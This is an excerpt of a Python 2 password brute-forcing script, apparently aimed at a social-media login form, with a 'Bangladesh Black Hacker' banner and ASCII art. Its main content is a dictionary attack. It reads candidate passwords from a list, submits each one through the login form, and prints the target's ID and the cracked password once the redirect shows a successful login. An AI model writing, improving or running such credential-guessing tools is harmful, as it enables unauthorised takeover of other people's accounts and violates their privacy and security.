...
def banner():
    ...
    print WW+"  |      TEAM: Bangladesh Black Hacker          |"
    print Y+"   |             INSTAGRAM: L0l_H@c5er           |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        LIFE OF L0L H@C5ER [ L.O.L ]         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
...
def hacker(hacket_password):
  try:
	...
	noobs.form['pass'] = hacker_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
			...
			print "          P A S S W O R D  F I N D "
	         	...
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(hacker_password)
        	        print " "
      ...
      sys.exit()    	    
def life():
	global hacker_password
	password_nob = open(password_list, "r")
	for hacker_password in password_nob:
		password_nob = hacker_password.replace("\n","")
		hacker(hacker_password)		
         ...
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                ...
                \033[90;1mLife Of L0l H@c5er\033[91;1m
